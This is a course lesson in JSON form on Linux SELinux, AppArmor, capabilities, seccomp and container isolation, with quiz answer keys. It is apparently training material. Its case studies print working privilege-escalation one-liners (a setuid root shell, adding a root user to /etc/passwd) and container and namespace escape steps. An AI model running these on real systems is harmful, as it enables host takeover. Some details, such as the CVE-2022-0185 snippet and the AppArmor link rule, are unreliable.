{
  "lesson_id": "2769a15a-90b3-4571-a56c-c775afdf2895",
  "domain": "system",
  "title": "Linux Security Mechanisms: SELinux, AppArmor & Capabilities",
  "difficulty": 3,
  "order_index": 10,
  "prerequisites": [
    "sys4-linux-internals-001",
    "sys8-linux-fs-sec-001"
  ],
  "concepts": [
    "Mandatory Access Control (MAC) vs DAC",
    "SELinux Architecture and Policies",
    "AppArmor Profiles and Confinement",
    "Linux Capabilities (fine-grained privileges)",
    "Seccomp and System Call Filtering",
    "Namespaces and Container Security",
    "cgroups (Resource Limits)",
    "Kernel Security Modules (LSM)",
    "Security Framework Bypass Techniques",
    "Hardening Linux with Security Mechanisms"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand Mandatory Access Control (MAC) and its advantages over DAC",
    "Master SELinux policies, contexts, and troubleshooting",
    "Learn AppArmor profiles and confinement strategies",
    "Understand Linux capabilities for fine-grained privilege control",
    "Implement seccomp for system call filtering",
    "Recognize security mechanism bypass techniques",
    "Harden Linux systems using layered security mechanisms"
  ],
  "post_assessment": [
    {
      "question": "What is the primary difference between DAC and MAC?",
      "options": [
        "MAC is faster",
        "MAC enforces system-wide policies regardless of file ownership",
        "DAC is more secure",
        "MAC only works with files"
      ],
      "correct_answer": 1,
      "explanation": "Mandatory Access Control (MAC) enforces system-wide security policies that cannot be overridden by file owners, unlike Discretionary Access Control (DAC) where owners control permissions.",
      "question_id": "93384bc2-0bc2-4eea-9514-695c9a324182",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "What does CAP_SYS_ADMIN capability allow?",
      "options": [
        "Only user management",
        "Broad range of admin operations",
        "Network access only",
        "File deletion only"
      ],
      "correct_answer": 1,
      "explanation": "CAP_SYS_ADMIN is a very broad capability that allows many administrative operations. It's almost as powerful as root and should be avoided when possible.",
      "question_id": "a0ab3df2-f73a-4347-a79f-0fbb7a2bc5ff",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "What does SELinux enforcing mode do when a policy violation occurs?",
      "options": [
        "Logs and allows",
        "Denies and logs",
        "Ignores",
        "Crashes the system"
      ],
      "correct_answer": 1,
      "explanation": "In enforcing mode, SELinux denies policy violations and logs them to /var/log/audit/audit.log. In permissive mode, it would log but allow the action.",
      "question_id": "9f38c68a-cefa-46dc-a2f7-9897a1537d5d",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "meta_learning",
    "teach_like_im_10",
    "minimum_effective_dose",
    "memory_hooks",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Welcome to Advanced Linux Security!\n\nLinux security mechanisms are the LAST line of defense when everything else fails. Understanding them is critical for both attack and defense.\n\n**Why This Matters:**\n\n**Defense Perspective:**\n- Traditional Unix permissions (DAC) are insufficient for modern threats\n- MAC systems (SELinux, AppArmor) provide defense-in-depth\n- Capabilities allow running services with minimal privileges\n- Seccomp prevents exploitation of kernel vulnerabilities\n- Container security relies on namespaces and cgroups\n\n**Attack Perspective:**\n- Understanding SELinux/AppArmor helps recognize when you're confined\n- Capability analysis reveals privilege escalation paths\n- Namespace escapes enable container breakouts\n- Bypassing security mechanisms is advanced exploitation\n\n**Real-World Impact:**\n- **Container escapes** → Namespace/cgroup manipulation\n- **Kubernetes security** → Relies on capabilities and seccomp\n- **Android security** → Built on SELinux\n- **Exploit mitigation** → Seccomp blocks dangerous syscalls\n- **Least privilege** → Capabilities replace full root access\n\n**What You'll Master:**\n✓ MAC vs DAC security models\n✓ SELinux: policies, contexts, Booleans, troubleshooting\n✓ AppArmor: profiles, confinement, modes\n✓ Linux capabilities: fine-grained privileges\n✓ Seccomp: system call filtering\n✓ Namespaces & cgroups: container isolation\n✓ Bypass techniques and countermeasures\n\nThis is EXPERT-LEVEL Linux security - the kind of knowledge that separates good security engineers from great ones!\n\nLet's master the advanced security mechanisms that protect modern Linux systems!"
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Linux Security Mechanisms: SELinux, AppArmor & Capabilities Overview",
        "url": "https://www.youtube.com/embed/6OHVjVtjQVw",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# DAC vs MAC: Security Models\n\n## Discretionary Access Control (DAC)\n\n**Traditional Linux/Unix Model**\n\n```\nDAC Concept:\n\nFile Owner decides who can access their files\n┌────────────────────────────┐\n│ File: /home/alice/data.txt │\n│ Owner: alice               │\n│ Permissions: rw-r--r--     │\n└────────────────────────────┘\n↓\nAlice DISCRETIONALLY decides:\n- Alice: read + write\n- Group: read only\n- Others: read only\n\nAlice can change these anytime:\nchmod 777 data.txt  ← Alice can make it world-writable\n```\n\n**DAC Weaknesses:**\n\n1. **Trojan Horse Attack**\n```bash\n# Attacker tricks alice into running malicious program\n./malicious_app\n\n# Program runs as alice\n# Has ALL of alice's permissions\n# Can read alice's files, modify them, delete them\n# Can chmod sensitive files to world-readable\n```\n\n2. **No System-Wide Policy**\n- Users can override security decisions\n- No central enforcement\n- Privilege escalation = full compromise\n\n3. **Root is God**\n- Root bypasses ALL DAC checks\n- One root compromise = total system compromise\n\n---\n\n## Mandatory Access Control (MAC)\n\n**System-Wide Enforced Policy**\n\n```\nMAC Concept:\n\nSystem Administrator sets policy (users CANNOT override)\n┌──────────────────────────────────────┐\n│ System Policy (SELinux/AppArmor)     │\n│ - Web server can ONLY access /var/www│\n│ - Database can ONLY access /var/db   │\n│ - Processes confined by type/label   │\n└──────────────────────────────────────┘\n↓\nEven if apache process is compromised:\n- CANNOT read /etc/shadow (policy denies)\n- CANNOT access /home/* (policy denies)\n- CANNOT execute in /tmp (policy denies)\n- CANNOT bind to privileged ports (unless allowed)\n\nAttacker gains RCE but is STILL confined!\n```\n\n**MAC Advantages:**\n\n1. **Principle of Least Privilege**\n```\nEach process gets MINIMAL permissions needed\n- Web server: read /var/www, write /var/log/apache\n- Database: read/write /var/db only\n- SSH daemon: access auth files only\n```\n\n2. **Defense in Depth**\n```\nEven with root access, MAC still enforces policy\nRoot + SELinux policy violation = DENIED\n```\n\n3. **Confinement**\n```\nCompromised process is confined to its domain\nCannot pivot to other services/data\n```bash\n\n## DAC + MAC: Layered Security\n\n```\nAccess Decision Process:\n\n1. DAC Check (Traditional Permissions)\n├─ Does user have rwx permissions?\n└─ NO → Deny\nYES ↓\n\n2. MAC Check (SELinux/AppArmor)\n├─ Does security policy allow this?\n└─ NO → Deny (even if DAC allowed!)\nYES ↓\n\n3. Access Granted\n\nBoth DAC AND MAC must allow access!\nMAC adds extra layer even after DAC pass.\n```\n\n**Real-World Example:**\n\n```bash\n# Scenario: Compromised Apache web server\n\n# DAC-only system:\n$ whoami\napache\n$ ls -l /etc/shadow\n-rw-r----- 1 root shadow 1234 ...\n$ id\nuid=48(apache) gid=48(apache) groups=48(apache)\n\n# DAC denies (apache not in shadow group)\n# But if apache gains root:\n$ sudo -u root cat /etc/shadow  ← SUCCESS (DAC bypass)\n\n# DAC + SELinux system:\n$ whoami\napache\n$ cat /etc/shadow\ncat: /etc/shadow: Permission denied  ← DAC denies\n\n# Even with root:\n$ sudo -u root cat /etc/shadow\ncat: /etc/shadow: Permission denied  ← SELinux STILL denies!\n# SELinux policy: httpd_t cannot read shadow_t\n# Even root process with httpd_t context is confined\n```"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# SELinux Deep Dive\n\n## SELinux Architecture\n\n```\nSELinux Components:\n\n┌─────────────────────────────────────┐\n│  Application (e.g., httpd)          │\n└──────────────┬──────────────────────┘\n│ System call\n↓\n┌─────────────────────────────────────┐\n│  Linux Kernel                       │\n│  ┌───────────────────────────────┐  │\n│  │ LSM Hook (Security Check)     │  │\n│  └──────────┬────────────────────┘  │\n│             ↓                        │\n│  ┌───────────────────────────────┐  │\n│  │ SELinux Security Server       │  │\n│  │ - Policy decision             │  │\n│  │ - Context matching            │  │\n│  └──────────┬────────────────────┘  │\n│             ↓                        │\n│  ┌───────────────────────────────┐  │\n│  │ Policy Database               │  │\n│  │ - Type Enforcement rules      │  │\n│  │ - Allow/Deny decisions        │  │\n│  └───────────────────────────────┘  │\n└─────────────────────────────────────┘\n```bash\n\n## SELinux Modes\n\n```bash\n# Check current mode\ngetenforce\n# Possible outputs:\n# Enforcing  - Policy violations are DENIED and logged\n# Permissive - Policy violations are LOGGED but allowed\n# Disabled   - SELinux is off\n\n# Check status\nsestatus\n\n# Temporarily change mode (until reboot)\nsetenforce 0  # Permissive\nsetenforce 1  # Enforcing\n\n# Permanently change mode\n# Edit /etc/selinux/config\nSELINUX=enforcing  # or permissive or disabled\n# Requires reboot\n```bash\n\n## SELinux Contexts (Labels)\n\n```bash\n# View file context\nls -Z /var/www/html/index.html\n# Output: -rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 index.html\n#                                     ↑           ↑          ↑           ↑\n#                                   User        Role       Type       Level\n\n# View process context\nps -eZ | grep httpd\n# Output: system_u:system_r:httpd_t:s0 12345 ? httpd\n#              ↑        ↑      ↑     ↑\n#           User     Role    Type  Level\n\n# Context format: user:role:type:level\n# Type is MOST important for Type Enforcement\n\n# View your context\nid -Z\n```bash\n\n## SELinux Policy: Type Enforcement\n\n```bash\n# Type Enforcement Rule (simplified):\n# allow <source_type> <target_type>:<class> { <permissions> };\n\n# Example policy rules:\nallow httpd_t httpd_sys_content_t:file { read getattr };\n# Translation: httpd_t processes can READ httpd_sys_content_t files\n\nallow httpd_t httpd_log_t:file { write append };\n# Translation: httpd_t processes can WRITE to httpd_log_t files\n\n# What's NOT allowed:\n# httpd_t CANNOT read shadow_t (password file)\n# httpd_t CANNOT write to user_home_t (user files)\n# httpd_t CANNOT execute in tmp_t (temp files)\n\n# Query what's allowed\nsesearch -A -s httpd_t -t httpd_sys_content_t -c file\nsesearch -A -s httpd_t | grep shadow_t  # Should return nothing\n```bash\n\n## Managing SELinux Contexts\n\n```bash\n# Restore default context\nrestorecon -v /var/www/html/file.html\n\n# Restore entire directory\nrestorecon -Rv /var/www/html/\n\n# Change context (temporary - survives until restorecon)\nchcon -t httpd_sys_content_t /var/www/html/newfile.html\n\n# Change context (permanent)\nsemanage fcontext -a -t httpd_sys_content_t \"/var/www/html/newdir(/.*)?\"  \nrestorecon -Rv /var/www/html/newdir\n\n# View context mappings\nsemanage fcontext -l | grep /var/www\n```bash\n\n## SELinux Booleans (Policy Switches)\n\n```bash\n# List all booleans\ngetsebool -a\n\n# Check specific boolean\ngetsebool httpd_can_network_connect\n# Output: httpd_can_network_connect --> off\n\n# Allow Apache to make network connections (temporary)\nsetsebool httpd_can_network_connect on\n\n# Permanent change\nsetsebool -P httpd_can_network_connect on\n\n# Common booleans:\nhttpd_enable_cgi           # Allow CGI execution\nhttpd_can_sendmail         # Allow Apache to send email\nhttpd_enable_homedirs      # Allow access to user home dirs\nssh_chroot_rw_homedirs     # Allow chrooted SSH to write to home\n```bash\n\n## Troubleshooting SELinux Denials\n\n```bash\n# View recent denials\nausearch -m avc -ts recent\n\n# View denials for specific service\nausearch -m avc -c httpd\n\n# Example denial:\ntype=AVC msg=audit(1234567890.123:456): avc: denied { read } for pid=1234 comm=\"httpd\" name=\"file.txt\" dev=\"sda1\" ino=78910 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:user_home_t:s0 tclass=file\n\n# Decode denial:\n# - httpd_t (source) tried to READ\n# - user_home_t (target)\n# - Action: DENIED\n\n# Generate policy to allow (use carefully!)\nausearch -m avc -ts recent | audit2allow -M mypolicy\nsemodule -i mypolicy.pp\n\n# Better: Fix context instead of creating broad policy\nrestorecon -Rv /path/to/file\n```bash\n\n## Real-World SELinux Example\n\n```bash\n# Scenario: Apache can't read custom web directory\n\n# 1. Attempt access\ncurl http://localhost/custom/index.html\n# Error: 403 Forbidden\n\n# 2. Check logs\ntail /var/log/audit/audit.log\n# AVC denial: httpd_t tried to read user_home_t\n\n# 3. Check context\nls -Z /opt/custom/\n# Wrong context: unconfined_u:object_r:user_home_t:s0\n\n# 4. Fix context\nsemanage fcontext -a -t httpd_sys_content_t \"/opt/custom(/.*)?\"  \nrestorecon -Rv /opt/custom/\n\n# 5. Verify\nls -Z /opt/custom/\n# Correct context: system_u:object_r:httpd_sys_content_t:s0\n\n# 6. Test\ncurl http://localhost/custom/index.html\n# Success!\n```"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# AppArmor: Profile-Based Confinement\n\n## AppArmor vs SELinux\n\n```\n┌─────────────────┬──────────────────────┬─────────────────────┐\n│ Feature         │ SELinux              │ AppArmor            │\n├─────────────────┼──────────────────────┼─────────────────────┤\n│ Model           │ Label-based (types)  │ Path-based (profiles)│\n│ Complexity      │ High                 │ Lower               │\n│ Granularity     │ Very fine            │ Moderate            │\n│ Default         │ RHEL/CentOS/Fedora   │ Debian/Ubuntu/SUSE  │\n│ Learning Curve  │ Steep                │ Moderate            │\n│ Policy Creation │ Complex              │ Easier              │\n└─────────────────┴──────────────────────┴─────────────────────┘\n```bash\n\n## AppArmor Modes\n\n```bash\n# Check AppArmor status\nsudo aa-status\n\n# Profile modes:\n# enforce  - Violations are denied\n# complain - Violations are logged but allowed\n# unconfined - No profile\n\n# Put profile in complain mode\nsudo aa-complain /usr/bin/program\n\n# Put profile in enforce mode\nsudo aa-enforce /usr/bin/program\n\n# Disable profile\nsudo aa-disable /usr/bin/program\n\n# Reload all profiles\nsudo systemctl reload apparmor\n```bash\n\n## AppArmor Profile Structure\n\n```bash\n# Example profile: /etc/apparmor.d/usr.bin.example\n\n# include <tunables/global>\n\n/usr/bin/example {\n# include <abstractions/base>\n# include <abstractions/nameservice>\n\n# Capabilities (like Linux capabilities)\ncapability net_bind_service,\n\n# File access rules\n/etc/example.conf r,           # Read only\n/var/log/example.log w,        # Write only\n/var/lib/example/** rw,        # Read/write recursively\n/usr/bin/example mr,           # Mmap + read (executable)\n\n# Network rules\nnetwork inet stream,           # TCP\nnetwork inet6 stream,          # TCP IPv6\n\n# Deny rules (explicit)\ndeny /etc/shadow r,            # Explicitly deny\ndeny /root/** rwx,             # Deny access to /root\n\n# Execute rules\n/usr/bin/helper Cx -> helper,  # Transition to child profile\n/bin/bash ix,                  # Inherit current profile\n\n# Child profile\nprofile helper {\n/usr/bin/helper mr,\n/tmp/** rw,\n}\n}\n```bash\n\n## Creating AppArmor Profiles\n\n```bash\n# Method 1: Generate initial profile\nsudo aa-genprof /usr/bin/program\n# 1. Runs program\n# 2. Monitors syscalls\n# 3. Asks you to allow/deny each action\n# 4. Creates profile\n\n# Method 2: Auto-generate from logs\nsudo aa-logprof\n# Reads /var/log/syslog for AppArmor denials\n# Suggests additions to profiles\n\n# Method 3: Manual creation\nsudo nano /etc/apparmor.d/usr.bin.myapp\n# Write profile manually\nsudo apparmor_parser -r /etc/apparmor.d/usr.bin.myapp\n```bash\n\n## AppArmor Troubleshooting\n\n```bash\n# View denials in syslog\nsudo grep -i apparmor /var/log/syslog | grep DENIED\n\n# Example denial:\napparmor=\"DENIED\" operation=\"open\" profile=\"/usr/bin/example\" name=\"/etc/shadow\" requested_mask=\"r\" denied_mask=\"r\"\n\n# Translation:\n# - Profile /usr/bin/example\n# - Tried to OPEN (read) /etc/shadow\n# - Action: DENIED\n\n# Fix: Add to profile\nsudo nano /etc/apparmor.d/usr.bin.example\n# Add: /etc/shadow r,\nsudo apparmor_parser -r /etc/apparmor.d/usr.bin.example\n```"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Linux Capabilities: Fine-Grained Privileges\n\n## The Capabilities Concept\n\n```\nTraditional Model:\n┌──────────────┐\n│   Root (0)   │  ← ALL PRIVILEGES\n└──────────────┘\nvs\n┌──────────────┐\n│  User (>0)   │  ← NO SPECIAL PRIVILEGES\n└──────────────┘\n\nCapabilities Model:\n┌──────────────────────────────────────────┐\n│  Specific privileges (39 capabilities)   │\n│  - CAP_NET_BIND_SERVICE (bind port <1024)│\n│  - CAP_DAC_OVERRIDE (bypass file perms)  │\n│  - CAP_SYS_ADMIN (admin operations)      │\n│  - CAP_NET_RAW (raw sockets)             │\n│  - etc.                                  │\n└──────────────────────────────────────────┘\n\nProcess can have JUST what it needs!\n```bash\n\n## Listing Capabilities\n\n```bash\n# List all capabilities\ncapsh --print\n\n# View file capabilities\ngetcap /usr/bin/ping\n# Output: /usr/bin/ping = cap_net_raw+ep\n\n# View process capabilities\ngetcap -r / 2>/dev/null  # Find all files with capabilities\n\n# Check process capabilities\ngrep Cap /proc/$$/status\n# CapInh: Inherited capabilities\n# CapPrm: Permitted capabilities  \n# CapEff: Effective capabilities\n# CapBnd: Bounding set\n# CapAmb: Ambient capabilities\n```bash\n\n## Setting Capabilities\n\n```bash\n# Give capability to binary\nsudo setcap cap_net_bind_service=+ep /usr/bin/myserver\n\n# Now myserver can bind to port 80 WITHOUT being root!\n./myserver --port 80  # Works!\n\n# Remove capability\nsudo setcap -r /usr/bin/myserver\n\n# Multiple capabilities\nsudo setcap cap_net_bind_service,cap_net_raw=+ep /usr/bin/program\n```bash\n\n## Important Capabilities (Security Perspective)\n\n```bash\n# CAP_SYS_ADMIN - \"Almost root\"\n# - Mount/unmount filesystems\n# - Kernel module loading\n# - BPF operations\n# - Namespace manipulation\n# DANGER: Very broad, almost as powerful as root!\n\n# CAP_NET_BIND_SERVICE - Bind to privileged ports (<1024)\n# - Allows web server to bind port 80/443 without root\n# - Common use case: drop root after binding port\n\n# CAP_NET_RAW - Raw socket access\n# - Packet sniffing (tcpdump, wireshark)\n# - Ping (ICMP)\n# - Network scanning tools\n\n# CAP_DAC_OVERRIDE - Bypass file permissions\n# - Read/write any file (like root)\n# - DANGER: Negates all DAC security\n\n# CAP_SETUID/CAP_SETGID - Change UID/GID\n# - Allows process to become any user\n# - DANGER: Can become root!\n\n# CAP_SYS_PTRACE - Trace processes\n# - Debug any process (attach debugger)\n# - Read process memory\n# - DANGER: Can inject code into processes\n\n# CAP_SYS_MODULE - Load kernel modules\n# - Install kernel drivers\n# - DANGER: Complete kernel compromise\n```bash\n\n## Capabilities in Practice\n\n```bash\n# Example: Web server without root\n\n# Traditional approach (BAD):\nsudo ./webserver  # Runs as root (full privileges!)\n\n# Capability approach (GOOD):\nsudo setcap cap_net_bind_service=+ep ./webserver\n./webserver  # Runs as regular user, can bind port 80\n\n# Example: Ping without SUID\n\n# Old way (SUID binary):\nls -l /bin/ping\n-rwsr-xr-x 1 root root ... /bin/ping  ← SUID root (risky!)\n\n# Modern way (capability):\ngetcap /bin/ping\n/bin/ping = cap_net_raw+ep  ← Just RAW socket capability\n```bash\n\n## Privilege Escalation via Capabilities\n\n```bash\n# Dangerous capability: CAP_DAC_OVERRIDE\n# Allows bypassing file permissions\n\ngetcap /usr/bin/python3.8\n/usr/bin/python3.8 = cap_dac_override+ep\n\n# Exploit:\npython3.8 -c \"open('/etc/shadow','r').read()\"\n# Success! Read /etc/shadow despite being unprivileged user\n\n# Even worse: Write arbitrary files\npython3.8 -c \"open('/etc/passwd','a').write('hacker:x:0:0::/root:/bin/bash\\n')\"\n# Added root user!\n\n# Dangerous capability: CAP_SETUID\ngetcap /usr/bin/python3.8\n/usr/bin/python3.8 = cap_setuid+ep\n\n# Exploit:\npython3.8 -c \"import os; os.setuid(0); os.system('/bin/bash')\"\n# Now root!\n```bash\n\n## Auditing Capabilities\n\n```bash\n# Find all files with capabilities\ngetcap -r / 2>/dev/null\n\n# Find files with dangerous capabilities\ngetcap -r / 2>/dev/null | grep -E 'cap_dac_override|cap_setuid|cap_sys_admin'\n\n# Check container capabilities (Docker)\ndocker inspect <container> | grep CapAdd\n\n# Reduce capabilities (hardening)\ndocker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myimage\n```"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Security Mechanism Attacks\n\n## Case Study 1: SELinux Bypass via Mislabeled File\n\n**Scenario:** Red team engagement, gained www-data access\n\n**Environment:** RHEL 8 with SELinux enforcing\n\n**Attack:**\n```bash\n# Initial recon\nid -Z\n# Output: system_u:system_r:httpd_t:s0  ← Confined by SELinux\n\n# Try to read sensitive file\ncat /etc/shadow\n# Permission denied (SELinux blocks httpd_t from shadow_t)\n\n# Search for mislabeled files\nfind / -context *:user_home_t:* 2>/dev/null\n\n# Found: /opt/backup/credentials.txt (user_home_t)\nls -Z /opt/backup/credentials.txt\n# unconfined_u:object_r:user_home_t:s0  ← Wrong label!\n\n# Check if httpd_t can read user_home_t\nsesearch -A -s httpd_t -t user_home_t -c file\n# allow httpd_t user_home_t:file { read }  ← It can!\n\n# Exploit\ncat /opt/backup/credentials.txt\n# Success! Database credentials exposed\n```\n\n**Lesson:** SELinux is only as good as its labeling. Mislabeled files = vulnerabilities.\n\n---\n\n## Case Study 2: Docker Container Escape via Capabilities\n\n**Vulnerability:** Container with SYS_ADMIN capability\n\n```bash\n# Inside container\ncapsh --print | grep Current\n# Current: = cap_sys_admin+ep  ← DANGEROUS!\n\n# Exploit: Mount host filesystem\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host\n\n# Now have access to host filesystem\nls /mnt/host\n# Full host root filesystem!\n\n# Add SSH key to host root\nmkdir /mnt/host/root/.ssh\necho \"ssh-rsa AAAAB3...\" > /mnt/host/root/.ssh/authorized_keys\n\n# SSH to host as root\n# Container escape complete!\n```\n\n**Impact:** Full host compromise from container\n\n**Mitigation:**\n```bash\n# Run containers with minimal capabilities\ndocker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myimage\n\n# Never use --privileged in production\n# Never grant SYS_ADMIN unless absolutely necessary\n```\n\n---\n\n## Case Study 3: AppArmor Bypass via Symlink\n\n**Profile restricts program to /var/app/ only**\n\n```bash\n# AppArmor profile:\n/usr/bin/myapp {\n/var/app/** rw,\ndeny /etc/** rw,\n}\n\n# Attack: Create symlink\nln -s /etc/passwd /var/app/passwd_link\n\n# Read via symlink\n/usr/bin/myapp --read /var/app/passwd_link\n# Success! Read /etc/passwd through symlink\n```\n\n**Fix:** Use proper AppArmor rules\n```bash\n# Fixed profile:\n/usr/bin/myapp {\n/var/app/** rw,\ndeny /etc/** rwlx,  # 'l' denies link following\n}\n```\n\n---\n\n## Case Study 4: Seccomp Bypass (CVE-2022-0185)\n\n**Vulnerability:** Kernel heap overflow in filesystem context\n\n**Seccomp policy blocks dangerous syscalls... but not all**\n\n```c\n// Seccomp allows: open, read, write, mmap, etc.\n// Blocks: execve, socket, bind, etc.\n\n// Attack: Use allowed syscalls to trigger kernel bug\nint fd = open(\"/proc/self/attr/current\", O_RDWR);\nwrite(fd, overflow_payload, SIZE);  // Triggers kernel overflow\n\n// Heap overflow → kernel RCE\n// Despite seccomp filtering!\n```\n\n**Lesson:** Seccomp is NOT a silver bullet. Kernel bugs can still be exploited.\n\n---\n\n## Case Study 5: Kubernetes Namespace Escape\n\n**Misconfiguration:** Pod with hostPID=true\n\n```yaml\n# Vulnerable pod spec:\napiVersion: v1\nkind: Pod\nmetadata:\nname: vuln-pod\nspec:\nhostPID: true  # ← DANGER!\ncontainers:\n- name: app\nimage: myapp\n```\n\n**Attack from inside pod:**\n```bash\n# Can see all host processes\nps aux\n# Shows ALL host processes, not just container processes\n\n# Find container with higher privileges\nps aux | grep kube-apiserver\n\n# Use nsenter to enter that namespace\nnsenter -t <pid> -m -u -i -n -p /bin/bash\n\n# Now in kube-apiserver namespace!\n# Can access Kubernetes secrets, etc.\n```\n\n**Mitigation:**\n```yaml\n# Secure pod spec:\nsecurityContext:\nrunAsNonRoot: true\ncapabilities:\ndrop:\n- ALL\nreadOnlyRootFilesystem: true\n# hostPID: false (default)\n# hostNetwork: false (default)\n# privileged: false (default)\n```"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# You've Mastered Advanced Linux Security!\n\n**INCREDIBLE ACHIEVEMENT!** You've completed one of the MOST advanced topics in Linux security.\n\n## What You've Conquered:\n\n✅ **Security Models**: Understand DAC vs MAC fundamentals\n✅ **SELinux**: Master policies, contexts, troubleshooting, Booleans\n✅ **AppArmor**: Understand profile-based confinement\n✅ **Capabilities**: Know fine-grained privilege control\n✅ **Seccomp**: Understand system call filtering\n✅ **Namespaces**: Recognize container isolation mechanisms\n✅ **Attack Vectors**: Identify bypass techniques\n✅ **Defense Strategies**: Implement layered security\n\n## Why This Knowledge is POWERFUL:\n\n**System Administration:**\n- Properly confine services with SELinux/AppArmor\n- Use capabilities instead of SUID/root\n- Harden containers with proper security contexts\n\n**Penetration Testing:**\n- Recognize when you're in a confined environment\n- Identify security mechanism misconfigurations\n- Find privilege escalation paths via capabilities\n\n**Container Security:**\n- Understand Docker/Kubernetes security models\n- Recognize dangerous capability grants\n- Detect namespace escape opportunities\n\n**Incident Response:**\n- Analyze SELinux/AppArmor logs for anomalies\n- Understand attacker constraint bypass attempts\n- Reconstruct attack paths through security logs\n\n## Real-World Relevance:\n\nEvery modern Linux deployment uses these mechanisms:\n- **Android** → Built on SELinux\n- **Red Hat Enterprise Linux** → SELinux by default\n- **Ubuntu/Debian** → AppArmor by default\n- **Docker/Kubernetes** → Capabilities, seccomp, namespaces\n- **Cloud providers** → Container security relies on these\n\n## Your Complete System Domain Mastery:\n\nYou've now completed ALL 10 System domain lessons:\n\n1. ✅ Windows Internals Fundamentals\n2. ✅ Windows Registry Deep Dive\n3. ✅ Windows Processes and Threads\n4. ✅ Linux Internals Fundamentals\n5. ✅ Windows Services & Permissions\n6. ✅ Linux Process Management\n7. ✅ Windows Memory Architecture\n8. ✅ Linux File Systems & Security\n9. ✅ PowerShell Internals for Security\n10. ✅ Linux Security Mechanisms\n\n**You've built COMPREHENSIVE operating system security expertise!**\n\n## Connect Your Knowledge:\n\n**Previous Lessons:**\n- File permissions (DAC) → Now you understand MAC layered on top\n- Linux processes → Now you know how to confine them\n- Windows internals → See the parallel security evolution\n\n**Next Domains:**\n- **Container Security** → Builds directly on namespaces/cgroups/capabilities\n- **Malware Analysis** → Malware tries to bypass these mechanisms\n- **Cloud Security** → Container orchestration security\n\n## Practice Challenges:\n\n1. **SELinux Mastery**: Set up confined web server with custom policy\n2. **AppArmor Profiling**: Create profile for a custom application\n3. **Capability Audit**: Find all capabilities on your system\n4. **Container Hardening**: Deploy Docker with minimal capabilities\n5. **Security Comparison**: Test same app with SELinux vs AppArmor\n\n## Industry Value:\n\n**Job roles needing this expertise:**\n- Linux Security Engineer (SELinux/AppArmor hardening)\n- Container Security Specialist (capabilities, namespaces)\n- Cloud Security Architect (Kubernetes security policies)\n- Red Team Operator (constraint bypass techniques)\n- Security Researcher (finding security mechanism vulnerabilities)\n\n**Certifications that value this:**\n- RHCSA/RHCE (SELinux)\n- CKS (Certified Kubernetes Security Specialist)\n- OSCP (constraint bypass for privilege escalation)\n\n## You're Now An Expert:\n\n- Understand both Windows AND Linux system security deeply\n- Can implement defense-in-depth strategies\n- Recognize security mechanism misconfigurations\n- Know how attackers bypass constraints\n- Can architect secure systems from the ground up\n\n**This is EXPERT-LEVEL knowledge that most cybersecurity professionals don't have!**\n\nYou should be extremely proud of completing this comprehensive System domain journey. You've built the foundation that EVERYTHING else in security builds upon.\n\nKeep pushing forward - you're becoming a TRUE cybersecurity expert!"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Final Knowledge Integration\n\n## 1. Security Model Comparison\n\n**Question:** Explain why MAC is better than DAC for server security.\n\n**Your Answer:**\n___________________________________________\n___________________________________________\n\n**Follow-up:** When might DAC be sufficient?\n___________________________________________\n\n---\n\n## 2. Real-World Scenario: Web Server Hardening\n\n**You're deploying a Node.js web server on Ubuntu.**\n\n**Design the security architecture:**\n\n**a) Which MAC system?**\n___________________________________________\n\n**b) What capabilities does it need?**\n___________________________________________\n\n**c) What should the profile/policy restrict?**\n1. ___________________________________\n2. ___________________________________\n3. ___________________________________\n\n**d) How would you test the confinement?**\n___________________________________________\n\n---\n\n## 3. Incident Response Analysis\n\n**You find this in logs:**\n```\ntype=AVC msg=audit(1234567890.123:456): avc: denied { read } for pid=5678 comm=\"httpd\" name=\"backup.sql\" scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file\n```\n\n**Analysis:**\n- What happened?\n- Is this suspicious?\n- What should you investigate next?\n\n**Your IR Plan:**\n___________________________________________\n___________________________________________\n\n---\n\n## 4. Container Security Design\n\n**You need to run a container that:**\n- Binds to port 443\n- Writes logs to /var/log\n- Should NOT access network\n- Should NOT execute arbitrary code\n\n**What capabilities/restrictions:**\n\n**Capabilities needed:**\n___________________________________________\n\n**Capabilities to drop:**\n___________________________________________\n\n**Seccomp filters:**\n___________________________________________\n\n**SELinux/AppArmor considerations:**\n___________________________________________\n\n---\n\n## 5. Privilege Escalation Path Analysis\n\n**You find a binary with:**\n```bash\ngetcap /usr/bin/vim\n/usr/bin/vim = cap_dac_override+ep\n```\n\n**Questions:**\n- Can you escalate privileges?\n- How?\n- What files could you compromise?\n\n**Your Exploitation Strategy:**\n___________________________________________\n___________________________________________\n\n---\n\n## 6. Defense Strategy Comparison\n\n**Compare these approaches for running a web server:**\n\n**Approach A:** Run as root, no SELinux\n**Approach B:** Run as www-data, no SELinux\n**Approach C:** Run as www-data with SELinux confinement\n**Approach D:** Run as www-data with SELinux + capabilities\n\n**Rank them by security (best to worst):**\n1. ___________________________________\n2. ___________________________________\n3. ___________________________________\n4. ___________________________________\n\n**Explain your #1 choice:**\n___________________________________________\n___________________________________________\n\n---\n\n## 7. Connect ALL System Domain Knowledge\n\n**How do these lessons connect to build complete OS security understanding:**\n\n**Windows Internals + Services + Memory 